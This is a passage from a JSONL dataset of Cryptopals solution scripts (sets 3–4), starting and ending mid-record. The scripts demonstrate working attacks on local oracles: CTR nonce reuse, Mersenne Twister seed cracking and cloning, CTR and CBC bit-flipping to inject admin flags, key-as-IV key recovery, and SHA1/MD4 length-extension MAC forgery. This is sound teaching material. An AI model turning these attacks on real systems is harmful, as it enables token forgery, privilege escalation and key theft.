plaintexts\n    plaintexts = []\n    for c in ciphertexts:\n        plaintexts.append(xor_data(c, keystream))\n\n    return plaintexts\n\n\ndef main():\n    \"\"\"NOTE:\n    After writing this code I realized that the approach I was using was the S3C20 solution.\n\n    To solve this problem with a manual approach there are other ways. For example, we could start\n    by considering, for each position, the key (byte) which creates the most spaces (since the spaces\n    are very frequent), and then find patterns manually by guesses.\n\n    I like to use a Jupyter notebook for manually playing with these kind of challenges where\n    automating the steps is difficult and there has to be human intervention.\n    Maybe I will add a manual solution to this challenge at some point.\n    \"\"\"\n\n    original_plaintexts = []\n    ciphertexts = []\n    random_key = Random.new().read(AES.key_size[0])\n\n    with open(\"S3C19_input.txt\") as f:\n        for line in f:\n            original_plaintext = b64decode(line)\n            original_plaintexts.append(original_plaintext)\n            ciphertexts.append(aes_ctr(original_plaintext, random_key, 0))\n\n    cracked_plaintexts = crack_ctr_same_nonce(ciphertexts)\n\n    # Print each cracked plaintext. Some of them will be slightly different from the original plaintext\n    # but the attack is not perfect and as long as they are similar I would say that it worked.\n    for plaintext, original in zip(cracked_plaintexts, original_plaintexts):\n        print(plaintext)\n        # print(original)   # Check if the cracked plaintext matches the original plaintext\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C19"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C20.py", "category": "crypto", "solution_code": "from Crypto import Random\nfrom Crypto.Cipher import AES\nfrom base64 import b64decode\nfrom S3C18 import aes_ctr\nfrom S3C19 import crack_ctr_same_nonce\n\n\ndef main():\n    \"\"\"I actually used the suggested \"statistic\" approach to solve S3C19, so I will reuse the same code here.\"\"\"\n    original_plaintexts = []\n    ciphertexts = []\n    random_key = Random.new().read(AES.key_size[0])\n\n    with open(\"S3C20_input.txt\") as f:\n        for line in f:\n            original_plaintext = b64decode(line)\n            original_plaintexts.append(original_plaintext)\n            ciphertexts.append(aes_ctr(original_plaintext, random_key, 0))\n\n    cracked_plaintexts = crack_ctr_same_nonce(ciphertexts)\n\n    # Print each cracked plaintext. Some of them will be slightly different from the original plaintext\n    # but the attack is not perfect and as long as they are similar I would say that it worked.\n    for plaintext, original in zip(cracked_plaintexts, original_plaintexts):\n        print(plaintext)\n        # print(original)   # Check if the cracked plaintext matches the original plaintext\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C20"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C21.py", "category": "crypto", "solution_code": "def get_lowest_bits(n, number_of_bits):\n    \"\"\"Returns the lowest \"number_of_bits\" bits of n.\"\"\"\n    mask = (1 << number_of_bits) - 1\n    return n & mask\n\n\nclass MT19937:\n    \"\"\"This implementation resembles the one of the Wikipedia pseudo-code.\"\"\"\n    W, N, M, R = 32, 624, 397, 31\n    A = 0x9908B0DF\n    U, D = 11, 0xFFFFFFFF\n    S, B = 7, 0x9D2C5680\n    T, C = 15, 0xEFC60000\n    L = 18\n    F = 1812433253\n    LOWER_MASK = (1 << R) - 1\n    UPPER_MASK = get_lowest_bits(not LOWER_MASK, W)\n\n    def __init__(self, seed):\n        self.mt = []\n\n        self.index = self.N\n        self.mt.append(seed)\n        for i in range(1, self.index):\n            self.mt.append(get_lowest_bits(self.F * (self.mt[i - 1] ^ (self.mt[i - 1] >> (self.W - 2))) + i, self.W))\n\n    def extract_number(self):\n        if self.index >= self.N:\n            self.twist()\n\n        y = self.mt[self.index]\n        y ^= (y >> self.U) & self.D\n        y ^= (y << self.S) & self.B\n        y ^= (y << self.T) & self.C\n        y ^= (y >> self.L)\n\n        self.index += 1\n        return get_lowest_bits(y, self.W)\n\n    def twist(self):\n        for i in range(self.N):\n            x = (self.mt[i] & self.UPPER_MASK) + (self.mt[(i + 1) % self.N] & self.LOWER_MASK)\n            x_a = x >> 1\n            if x % 2 != 0:\n                x_a ^= self.A\n\n            self.mt[i] = self.mt[(i + self.M) % self.N] ^ x_a\n\n        self.index = 0\n\n\ndef main():\n    # Check if the numbers look random\n    for i in range(10):\n        print(MT19937(i).extract_number())\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C21"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C22.py", "category": "crypto", "solution_code": "from S3C21 import MT19937\nfrom random import randint\nfrom time import time\n\n# This is to fake the current time and avoid waiting with a sleep()\ncurrent_time = int(time())\n\n\ndef routine_rng():\n    \"\"\"Performs the operations specified in the challenge and returns the first result of the\n    newly created MT19937 rng.\n    \"\"\"\n    global current_time\n    current_time += randint(40, 1000)\n\n    seed = current_time\n    rng = MT19937(seed)\n\n    current_time += randint(40, 1000)\n    return seed, rng.extract_number()\n\n\ndef crack_mt19937_seed(rng_output):\n    \"\"\"Finds the seed that was used to get rng_output as the first output of an MT19937 rng.\n    The approach used is to try the most recent timestamps as seeds until the\n    first output of the newly created MT19937 matches rng_output.\n    \"\"\"\n    global current_time\n\n    # Start from the current timestamp plus one second, so that we can still find the seed even when the\n    # timestamp was not increased (or the program ran fast enough to get the answer in the same timestamp)\n    guessed_seed = current_time + 1\n    rng = MT19937(guessed_seed)\n\n    # Decrease the Unix timestamp by 1 second every time until we find the same output\n    while rng.extract_number() != rng_output:\n        guessed_seed -= 1\n        rng = MT19937(guessed_seed)\n\n    # If the output of a MT19937 with our guessed seed was the same as rng_output, then\n    # it means that the seed we guessed was really equal to the original one.\n    return guessed_seed\n\n\ndef main():\n    real_seed, rng_output = routine_rng()\n    assert real_seed == crack_mt19937_seed(rng_output)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C22"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C23.py", "category": "crypto", "solution_code": "from S3C21 import MT19937\nfrom random import randint\n\n\ndef get_bit(number, position):\n    \"\"\"Returns the bit at the given position of the given number. The position\n    is counted starting from the left in the binary representation (from the most\n    significant to the least significant bit).\n    \"\"\"\n    if position < 0 or position > 31:\n        return 0\n    return (number >> (31 - position)) & 1\n\n\ndef set_bit_to_one(number, position):\n    \"\"\"Sets the bit at the given position of the given number to 1.The position\n    is counted starting from the left in the binary representation (from the most\n    significant to the least significant bit).\n    \"\"\"\n    return number | (1 << (31 - position))\n\n\ndef undo_right_shift_xor(result, shift_len):\n    \"\"\"When the right shift and then XOR are done, the first \"shift_len\" bits of the result\n    (starting from the left) are the same as the original value before the operation (try\n    it on paper, it is simply because when we shift the input to the right its first bits\n    will be zeros, and when we XOR something against zeros, that something does not change).\n\n    The following bits will instead be equal to the XOR of the original bit at their same\n    position and the original bit that was \"shift_len\" positions behind. It will be easy\n    then to recover the original bit at their position by simply XORing the resulting bit\n    with the original bit \"shift_len\" positions behind (and we already have that bit because\n    we started this process from the left).\n    \"\"\"\n    original = 0\n    for i in range(32):\n        next_bit = get_bit(result, i) ^ get_bit(original, i - shift_len)\n        if next_bit == 1:\n            original = set_bit_to_one(original, i)\n\n    return original\n\n\ndef undo_left_shift_xor_and(result, shift_len, andd):\n    \"\"\"When the left shift, then XOR and then the AND are done, we can reverse the process\n    bit by bit by redoing the AND between the un-shifted resulting value and the and'd value\n    and then by XORing with the corresponding bit of the given result.\n    Sounds like magic, but try it on paper and you'll see that it works.\n    This time the process is doing starting from the right and each bit is AND'd with the bit\n    shift_len positions above.\n    \"\"\"\n    original = 0\n    for i in range(32):\n        next_bit = get_bit(result, 31 - i) ^ \\\n                   (get_bit(original, 31 - (i - shift_len)) &\n                    get_bit(andd, 31 - i))\n\n        if next_bit == 1:\n            original = set_bit_to_one(original, 31 - i)\n\n    return original\n\n\ndef untemper(y):\n    \"\"\"Reverts the operations done in the \"tampering\" process when the function extract_number() of\n    the MT19937 generator is called, and returns the initial value state of the generator corresponding\n    to its current index.\n    \"\"\"\n    y = undo_right_shift_xor(y, MT19937.L)\n    y = undo_left_shift_xor_and(y, MT19937.T, MT19937.C)\n    y = undo_left_shift_xor_and(y, MT19937.S, MT19937.B)\n    y = undo_right_shift_xor(y, MT19937.U)\n    return y\n\n\ndef get_cloned_rng(original_rng):\n    \"\"\"Taps the given rng for 624 outputs, untempers each of them to recreate the state of the generator,\n    and splices that state into a new \"cloned\" instance of the MT19937 generator.\n    \"\"\"\n    mt = []\n\n    # Recreate the state mt of original_rng\n    for i in range(MT19937.N):\n        mt.append(untemper(original_rng.extract_number()))\n\n    # Create a new generator and set it to have the same state\n    cloned_rng = MT19937(0)\n    cloned_rng.mt = mt\n\n    return cloned_rng\n\n\ndef main():\n    seed = randint(0, 2**32 - 1)\n    rng = MT19937(seed)\n    cloned_rng = get_cloned_rng(rng)\n\n    # Check that the two PRNGs produce the same output now\n    for i in range(1000):\n        assert rng.extract_number() == cloned_rng.extract_number()\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C23"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C24.py", "category": "crypto", "solution_code": "from S3C21 import MT19937\nfrom random import randint\nfrom Crypto import Random\nfrom S2C10 import xor_data\nimport struct\n\n\nclass MT19937Cipher:\n\n    def __init__(self, key):\n        self._rng = MT19937(key)\n\n    def encrypt(self, plaintext):\n        \"\"\"Uses the MT19937 PRNG to generate a keystream of enough bytes (at least as long as the\n        text we want to encrypt/decrypt), and then XORs it with the input text.\n        \"\"\"\n        keystream = b''\n\n        # We use all the bits of the PRNG outputs (there is no need take just 16 bits per output)\n        while len(keystream) < len(plaintext):\n            keystream += struct.pack('>L', self._rng.extract_number())\n\n        return xor_data(plaintext, keystream)\n\n    def decrypt(self, ciphertext):\n        \"\"\"Decryption works the same as encryption.\"\"\"\n        return self.encrypt(ciphertext)\n\n\ndef find_mt19937_stream_cipher_key(ciphertext, known_plaintext):\n    \"\"\"Brute-force all possible 16-bit seeds (used as a key for the MT19937 stream cipher) until the\n    ciphertext decrypts to a message containing our username (which is a known part of the plaintext).\n    \"\"\"\n    print(\"> Brute-forcing all possible seeds...\")\n\n    for guessed_seed in range(2**16):\n        candidate = MT19937Cipher(guessed_seed).decrypt(ciphertext)\n\n        if known_plaintext in candidate:\n            print(\"> Seed found:\", guessed_seed)\n            return guessed_seed\n\n    # If after trying all the possible 16-bit seeds we still haven't\n    # found the right one, it means that it was not a 16-bit number.\n    raise Exception(\"The seed was not a 16 bit number\")\n\n\ndef main():\n    # Generate a random seed, which we'll use as a key\n    seed = randint(0, 2 ** 16 - 1)\n\n    # Generate the plaintext which will be encrypted to get the password token\n    random_prefix = Random.new().read(randint(0, 100)) + b';'  # Small to make the cracking just slightly faster\n    known_plaintext = b'ricpacca'                       # Username of someone willing to reset his password\n    random_suffix = b';' + b'password_reset=true'       # Let's make it more realistic\n\n    ciphertext = MT19937Cipher(seed).encrypt(random_prefix + known_plaintext + random_suffix)\n    guessed_seed = find_mt19937_stream_cipher_key(ciphertext, known_plaintext)\n\n    # Check that the attack worked and print the recovered plaintext\n    assert guessed_seed == seed\n    print(\"> Decrypted password reset plaintext:\", MT19937Cipher(seed).encrypt(ciphertext))\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C24"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C25.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom S1C07 import aes_ecb_decrypt\nfrom S3C18 import aes_ctr\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom S2C10 import xor_data\nimport struct\n\n\nclass Oracle:\n\n    def __init__(self):\n        self._key = Random.new().read(AES.key_size[0])\n\n    def edit(self, ciphertext, offset, new_text):\n        \"\"\"Changes the underlying plaintext of the given ciphertext at offset so that it\n        contains new_text. Returns the new corresponding ciphertext.\n        \"\"\"\n\n        # Get the indexes of the first and last block that will be affected by the change\n        start_block = int(offset / AES.block_size)\n        end_block = int((offset + len(new_text) - 1) / AES.block_size)\n\n        # Find the keystream that would be used to encrypt the bytes in the affected blocks\n        keystream = b''\n        cipher = AES.new(self._key, AES.MODE_ECB)\n        for block in range(start_block, end_block + 1):\n\n            # Use the block number as counter (since we \"know\" that the counter starts from 0)\n            # and set the nonce to 0 (we also \"know\" that).\n            keystream += cipher.encrypt(struct.pack('<QQ', 0, block))\n\n        # Find the precise bytes of the found keystream that would be used to encrypt new_text\n        key_offset = offset % AES.block_size\n        keystream = keystream[key_offset:key_offset + len(new_text)]\n\n        # Encrypt new_text with the computed same-length keystream\n        insert = xor_data(new_text, keystream)\n\n        # Insert the new encrypted chunk in the ciphertext overwriting the underlying bytes at offset\n        return ciphertext[:offset] + insert + ciphertext[offset + len(insert):]\n\n    def encrypt(self, plaintext):\n        \"\"\"Encrypts the given plaintext with AES-CTR with a nonce of 0.\"\"\"\n        return aes_ctr(plaintext, self._key, 0)\n\n\ndef break_random_access_read_write_aes_ctr(ciphertext, encryption_oracle):\n    \"\"\"If the attacker has access to the edit() function to write on the ciphertext,\n    then it is easy to decrypt the underlying plaintext:\n\n    Since we know that the edit() function will encrypt the new_text that we give it\n    with the same keystream used in the original ciphertext (shifted by offset), we can\n    simply set the offset to zero and then overwrite the underlying plaintext of our ciphertext\n    to be the ciphertext itself. Because by encrypting the ciphertext again we will basically\n    decrypt it (that's how AES CTR works), the edit will return to us the original plaintext!\n    \"\"\"\n\n    # Assume random key is still unknown, the attacker can control only offset and new_text\n    # (given the ciphertext).\n    return encryption_oracle.edit(ciphertext, 0, ciphertext)\n\n\ndef main():\n    with open(\"S1C07_input.txt\") as input_file:\n        binary_data = b64decode(input_file.read())\n\n    plaintext = aes_ecb_decrypt(binary_data, b'YELLOW SUBMARINE')\n    oracle = Oracle()\n\n    # Compute the ciphertext and give it to the attacker\n    ciphertext = oracle.encrypt(plaintext)\n    cracked_plaintext = break_random_access_read_write_aes_ctr(ciphertext, oracle)\n\n    # Check if the attack worked\n    assert plaintext == cracked_plaintext\n    print(cracked_plaintext.decode().rstrip())\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S4C25"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C26.py", "category": "crypto", "solution_code": "from S3C18 import aes_ctr\nfrom random import randint\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom S2C10 import xor_data\n\n\nclass Oracle:\n\n    def __init__(self):\n        self._key = Random.new().read(AES.key_size[0])\n        self._nonce = randint(0, 2 ** 32 - 1)\n        self._prefix = \"comment1=cooking%20MCs;userdata=\"\n        self._suffix = \";comment2=%20like%20a%20pound%20of%20bacon\"\n\n    def encrypt(self, data):\n        \"\"\"Adds the prefix and the suffix specified in the challenge and encrypts the data with AES-CTR\"\"\"\n        data = data.decode().replace(';', '').replace('=', '')  # Remove special characters to avoid injection\n        plaintext = (self._prefix + data + self._suffix).encode()\n        return aes_ctr(plaintext, self._key, self._nonce)\n\n    def decrypt_and_check_admin(self, ciphertext):\n        \"\"\"Decrypts the string and returns whether the characters \";admin=true;\" are in the string\"\"\"\n        data = aes_ctr(ciphertext, self._key, self._nonce)\n        return b';admin=true;' in data\n\n\ndef get_prefix_length(oracle):\n    \"\"\"Finds the length of the prefix that mysterious_encrypt adds to the plaintext before encrypting.\"\"\"\n    # Encrypt two different ciphertexts\n    ciphertext_a = oracle.encrypt(b'A')\n    ciphertext_b = oracle.encrypt(b'B')\n\n    # Since the stream ciphers encrypts bit by bit, the prefix length will be equal to\n    # the number of bytes that are equal in the two ciphertext.\n    prefix_length = 0\n    while ciphertext_a[prefix_length] == ciphertext_b[prefix_length]:\n        prefix_length += 1\n\n    return prefix_length\n\n\ndef ctr_bit_flip(oracle):\n    \"\"\"Performs a stream cipher bit flipping attack to accomplish admin privileges in the decrypted data.\"\"\"\n    plaintext = b'?admin?true'\n    ciphertext = oracle.encrypt(plaintext)\n\n    # Prepare the data with which we want to XOR our goal ciphertext substring\n    goal_text = b';admin=true'\n    insert = xor_data(plaintext, goal_text)\n\n    # Find the position where our goal ciphertext substring starts\n    prefix_length = get_prefix_length(oracle)\n\n    # Force our goal ciphertext block to be the encryption of our goal text\n    forced_ciphertext = ciphertext[:prefix_length] + \\\n                        xor_data(ciphertext[prefix_length:prefix_length + len(plaintext)], insert) + \\\n                        ciphertext[prefix_length + len(plaintext):]\n\n    return forced_ciphertext\n\n\ndef main():\n    oracle = Oracle()\n    forced_ciphertext = ctr_bit_flip(oracle)\n\n    # Check if the ciphertext was forced properly\n    assert oracle.decrypt_and_check_admin(forced_ciphertext)\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S4C26"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C27.py", "category": "crypto", "solution_code": "from S2C10 import aes_cbc_decrypt\nfrom S2C16 import find_block_length, find_prefix_length, Oracle\nfrom S2C10 import xor_data\n\n\ndef check_ascii_compliance(plaintext):\n    \"\"\"Returns true if all the characters of plaintext are ASCII compliant (ie are in the ASCII table).\"\"\"\n    return all(c < 128 for c in plaintext)\n\n\nclass LazyOracle(Oracle):\n    \"\"\"This oracle uses the key also as IV, which makes it insecure.\"\"\"\n\n    def __init__(self):\n        super().__init__()\n        self._iv = self._key    # Let's be lazy here\n\n    def decrypt_and_check_admin(self, ciphertext):\n        \"\"\"Decrypts the ciphertext and: if the decrypted message is not ASCII compliant, raises an exception \n        and returns the bad plaintext; otherwise returns whether the characters \";admin=true;\" are in the string.\n        \"\"\"\n        plaintext = aes_cbc_decrypt(ciphertext, self._key, self._iv)\n\n        if not check_ascii_compliance(plaintext):\n            raise Exception(\"The message is not valid\", plaintext)\n\n        return b';admin=true;' in plaintext\n\n\ndef get_key_from_insecure_cbc(encryption_oracle):\n    \"\"\"Recovers the key from the lazy encryption oracle using the key also as iv.\n    The approach used is the simple one outlined in the challenge description.\n    \"\"\"\n    block_length = find_block_length(encryption_oracle.encrypt)\n    prefix_length = find_prefix_length(encryption_oracle.encrypt, block_length)\n\n    # Create three different blocks of plaintext and encrypt their concatenation\n    p_1 = 'A' * block_length\n    p_2 = 'B' * block_length\n    p_3 = 'C' * block_length\n    ciphertext = encryption_oracle.encrypt(p_1 + p_2 + p_3)\n\n    # Force the ciphertext to be \"C_1, 0, C_1\"\n    forced_ciphertext = ciphertext[prefix_length:prefix_length + block_length] + b'\\x00' * block_length + \\\n                        ciphertext[prefix_length:prefix_length + block_length]\n\n    # Expect an exception from the lazy oracle\n    try:\n        encryption_oracle.decrypt_and_check_admin(forced_ciphertext)\n    except Exception as e:\n        forced_plaintext = e.args[1]\n\n        # Compute the key and return it\n        # The first block of the plaintext will be equal to (decryption of c_1 XOR iv).\n        # The last block of the plaintext will be equal to (decryption of c_1 XOR 0).\n        # Therefore, to get the iv (which we know is equal to the key), we can just\n        # xor the first and last blocks together.\n        return xor_data(forced_plaintext[:block_length], forced_plaintext[-block_length:])\n\n    raise Exception(\"Was not able to hack the key\")\n\n\ndef main():\n    encryption_oracle = LazyOracle()\n    hacked_key = get_key_from_insecure_cbc(encryption_oracle)\n\n    # Check that the key was recovered correctly\n    assert encryption_oracle._key == hacked_key\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C27"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C28.py", "category": "crypto", "solution_code": "import struct\nimport hashlib\n\n\ndef left_rotate(value, shift):\n    \"\"\"Returns value left-rotated by shift bits. In other words, performs a circular shift to the left.\"\"\"\n    return ((value << shift) & 0xffffffff) | (value >> (32 - shift))\n\n\ndef sha1(message, ml=None, h0=0x67452301, h1=0xEFCDAB89, h2=0x98BADCFE, h3=0x10325476, h4=0xC3D2E1F0):\n    \"\"\"Returns a string containing the SHA1 hash of the input message. This is a pure python 3 SHA1\n    implementation, written starting from the SHA1 pseudo-code on Wikipedia.\n\n    The parameters ml, h0, ..., h5 are for the next challenge.\n    \"\"\"\n    # Pre-processing:\n    if ml is None:\n        ml = len(message) * 8\n\n    message += b'\\x80'\n    while (len(message) * 8) % 512 != 448:\n        message += b'\\x00'\n\n    message += struct.pack('>Q', ml)\n\n    # Process the message in successive 512-bit chunks:\n    for i in range(0, len(message), 64):\n\n        # Break chunk into sixteen 32-bit big-endian integers w[i]\n        w = [0] * 80\n        for j in range(16):\n            w[j] = struct.unpack('>I', message[i + j * 4:i + j * 4 + 4])[0]\n\n        # Extend the sixteen 32-bit integers into eighty 32-bit integers:\n        for j in range(16, 80):\n            w[j] = left_rotate(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1)\n\n        # Initialize hash value for this chunk:\n        a = h0\n        b = h1\n        c = h2\n        d = h3\n        e = h4\n\n        # Main loop\n        for j in range(80):\n            if j <= 19:\n                f = d ^ (b & (c ^ d))\n                k = 0x5A827999\n            elif 20 <= j <= 39:\n                f = b ^ c ^ d\n                k = 0x6ED9EBA1\n            elif 40 <= j <= 59:\n                f = (b & c) | (d & (b | c))\n                k = 0x8F1BBCDC\n            else:\n                f = b ^ c ^ d\n                k = 0xCA62C1D6\n\n            temp = left_rotate(a, 5) + f + e + k + w[j] & 0xffffffff\n            e = d\n            d = c\n            c = left_rotate(b, 30)\n            b = a\n            a = temp\n\n        # Add this chunk's hash to result so far:\n        h0 = (h0 + a) & 0xffffffff\n        h1 = (h1 + b) & 0xffffffff\n        h2 = (h2 + c) & 0xffffffff\n        h3 = (h3 + d) & 0xffffffff\n        h4 = (h4 + e) & 0xffffffff\n\n    # Produce the final hash value (big-endian) as a 160 bit number, hex formatted:\n    return '%08x%08x%08x%08x%08x' % (h0, h1, h2, h3, h4)\n\n\ndef sha1_mac(key, message):\n    return sha1(key + message)\n\n\ndef main():\n    key = b'THIs_iS-a_\"SecRet\"-kEy.'\n    message = b'This is a message to test that our implementation of the SHA1 MAC works properly.'\n\n    hashed = sha1_mac(key, message)\n\n    # Verify that I implemented SHA1 correctly\n    h = hashlib.sha1(key + message)\n    assert (hashed == h.hexdigest())\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C28"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C29.py", "category": "crypto", "solution_code": "import struct\nfrom random import randint\nfrom binascii import unhexlify\nfrom S4C28 import sha1, sha1_mac\n\n\nclass Oracle:\n\n    def __init__(self):\n        # Choose a random word from the dictionary to use as key\n        with open(\"/usr/share/dict/words\") as dictionary:\n            candidates = dictionary.readlines()\n            self._key = candidates[randint(0, len(candidates) - 1)].rstrip().encode()\n\n    def validate(self, message, digest):\n        \"\"\"Checks if the given digest matches the keyed SHA1-mac of the given message.\"\"\"\n        return sha1_mac(self._key, message) == digest\n\n    def generate_digest(self, message):\n        \"\"\"Generates a SHA1 MAC digest using the secret key.\"\"\"\n        return sha1_mac(self._key, message)\n\n\ndef md_pad(message):\n    \"\"\"Pads the given message the same way the pre-processing of the SHA1 algorithm does.\"\"\"\n    ml = len(message) * 8\n    message += b'\\x80'\n    while (len(message) * 8) % 512 != 448:\n        message += b'\\x00'\n\n    message += struct.pack('>Q', ml)\n    return message\n\n\ndef length_extension_attack(message, original_digest, oracle):\n    \"\"\"Performs a length extension attack on the SHA1 keyed MAC, forging a variant of the given\n    message that ends with \";admin=true\". Returns the new message and its valid MAC digest.\n    \"\"\"\n    extra_payload = b';admin=true'\n\n    # Try multiple key lengths\n    for key_length in range(100):\n\n        # Get the forged message (original-message || glue-padding || new-message)\n        # The bytes of the key are not relevant in getting the glue padding, since we only\n        # care about its length. Therefore we can use any key for the padding purposes.\n        forged_message = md_pad(b'A' * key_length + message)[key_length:] + extra_payload\n\n        # Get the SHA1 internal state (h1, h2, h3, h4, h5) by reversing the last step of the hash\n        h = struct.unpack('>5I', unhexlify(original_digest))\n\n        # Compute the SHA1 hash of the extra payload, by setting the state of the SHA1 function to the\n        # cloned one that we deduced from the original digest.\n        # We also set the message length ml to be the total length of the message.\n        forged_digest = sha1(extra_payload, (key_length + len(forged_message)) * 8, h[0], h[1], h[2], h[3], h[4])\n\n        # If the forged digest is valid, return it together with the forged message\n        if oracle.validate(forged_message, forged_digest):\n            return forged_message, forged_digest\n\n    # Otherwise it means that we didn't guess correctly the key length\n    raise Exception(\"It was not possible to forge the message: maybe the key was longer than 100 characters.\")\n\n\ndef main():\n    oracle = Oracle()\n\n    # Compute the original digest of the given message\n    message = b'comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon'\n    message_digest = oracle.generate_digest(message)\n\n    # Forge a variant of this message and get its valid MAC\n    forged_message, forged_digest = length_extension_attack(message, message_digest, oracle)\n\n    # Check if the attack works properly\n    assert b';admin=true' in forged_message\n    assert oracle.validate(forged_message, forged_digest)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S4C29"}
{"source": "cryptopals", "path": "data\\cryptopals\\S4C30.py", "category": "crypto", "solution_code": "from random import randint\nfrom binascii import unhexlify, hexlify\nfrom S4C28 import left_rotate\nfrom struct import pack, unpack\n\n\nclass MD4:\n    \"\"\"Adapted from: https://github.com/FiloSottile/crypto.py/blob/master/3/md4.py\"\"\"\n    buf = [0x00] * 64\n\n    _F = lambda self, x, y, z: ((x & y) | (~x & z))\n    _G = lambda self, x, y, z: ((x & y) | (x & z) | (y & z))\n    _H = lambda self, x, y, z: (x ^ y ^ z)\n\n    def __init__(self, message, ml=None, A=0x67452301, B=0xefcdab89, C=0x98badcfe, D=0x10325476):\n        self.A, self.B, self.C, self.D = A, B, C, D\n\n        if ml is None:\n            ml = len(message) * 8\n\n        length = pack('<Q', ml)\n\n        while len(message) > 64:\n            self._handle(message[:64])\n            message = message[64:]\n\n        message += b'\\x80'\n        message += bytes((56 - len(message) % 64) % 64)\n        message += length\n\n        while len(message):\n            self._handle(message[:64])\n            message = message[64:]\n\n    def _handle(self, chunk):\n        X = list(unpack('<' + 'I' * 16, chunk))\n        A, B, C, D = self.A, self.B, self.C, self.D\n\n        for i in range(16):\n            k = i\n            if i % 4 == 0:\n                A = left_rotate((A + self._F(B, C, D) + X[k]) & 0xffffffff, 3)\n            elif i % 4 == 1:\n                D = left_rotate((D + self._F(A, B, C) + X[k]) & 0xffffffff, 7)\n            elif i % 4 == 2:\n                C = left_rotate((C + self._F(D, A, B) + X[k]) & 0xffffffff, 11)\n            elif i % 4 == 3:\n                B = left_rotate((B + self._F(C, D, A) + X[k]) & 0xffffffff, 19)\n\n        for i in range(16):\n            k = (i // 4) + (i % 4) * 4\n            if i % 4 == 0:\n                A = left_rotate((A + self._G(B, C, D) + X[k] + 0x5a827999) & 0xffffffff, 3)\n            elif i % 4 == 1:\n                D = left_rotate((D + self._G(A, B, C) + X[k] + 0x5a827999) & 0xffffffff, 5)\n            elif i % 4 == 2:\n                C = left_rotate((C + self._G(D, A, B) + X[k] + 0x5a827999) & 0xffffffff, 9)\n            elif i % 4 == 3:\n                B = left_rotate((B + self._G(C, D, A) + X[k] + 0x5a827999) & 0xffffffff, 13)\n\n        order = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]\n        for i in range(16):\n            k = order[i]\n            if i % 4 == 0:\n                A = left_rotate((A + self._H(B, C, D) + X[k] + 0x6ed9eba1) & 0xffffffff, 3)\n            elif i % 4 == 1:\n                D = left_rotate((D + self._H(A, B, C) + X[k] + 0x6ed9eba1) & 0xffffffff, 9)\n            elif i % 4 == 2:\n                C = left_rotate((C + self._H(D, A, B) + X[k] + 0x6ed9eba1) & 0xffffffff, 11)\n            elif i % 4 == 3:\n                B = left_rotate((B + self._H(C, D, A) + X[k] + 0x6ed9eba1) & 0xffffffff, 15)\n\n        self.A = (self.A + A) & 0xffffffff\n        self.B = (self.B + B) & 0xffffffff\n        self.C = (self.C + C) & 0xffffffff\n        self.D = (self.D + D) & 0xffffffff\n\n    def digest(self):\n        return pack('<4I', self.A, self.B, self.C, self.D)\n\n    def hex_digest(self):\n        return hexlify(self.digest()).decode()\n\n\nclass Oracle:\n\n    def __init__(self):\n        # Choose a random word from the dictionary to use as key\n        with open(\"/usr/share/dict/words\") as dictionary:\n            candidates = dictionary.readlines()\n            self._key = candidates[randint(0, len(candidates) - 1)].rstrip().encode()\n\n    def validate(self, message, digest):\n        \"\"\"Checks if the given digest matches the keyed MD4-mac of the given message.\"\"\"\n        return MD4(self._key + message).hex_digest() == digest\n\n    def generate_digest(self, message):\n        \"\"\"Generates a MD4 MAC digest using the secret key.\"\"\"\n        return MD4(self._key + message).hex_digest()\n\n\ndef md_pad(message):\n    \"\"\"Pads the given message the same way the pre-processing of the MD4 algorithm does.\"\"\"\n    ml = len(message) * 8\n\n    message += b'\\x80'\n    message += bytes((56 - len(message) % 64) % 64)\n    message += pack('<Q', ml)\n\n    return message\n\n\ndef length_extension_attack(message, original_digest, oracle):\n    \"\"\"Performs a length extension attack on the MD4 keyed MAC, forging a variant of the given\n    message that ends with \";admin=true\". Returns the new message and its valid MAC digest.\n    \"\"\"\n    extra_payload = b';admin=true'\n\n    # Try multiple key lengths\n    for key_length in range(100):\n\n        # Get the forged message (original-message || glue-padding || new-message)\n        # The bytes of the key are not relevant in getting the glue padding, since we only\n        # care about its length. Therefore we can use any key for the padding purposes.\n        forged_message = md_pad(b'A' * key_length + message)[key_length:] + extra_payload\n\n        # Get the MD4 internal state (h1, h2, h3, h4) by reversing the last step of the hash\n        h = unpack('<4I', unhexlify(original_digest))\n\n        # Compute the MD4 hash of the extra payload, by setting the state of the MD4 function to the\n        # cloned one that we deduced from the origi", "name": "S4C30"}
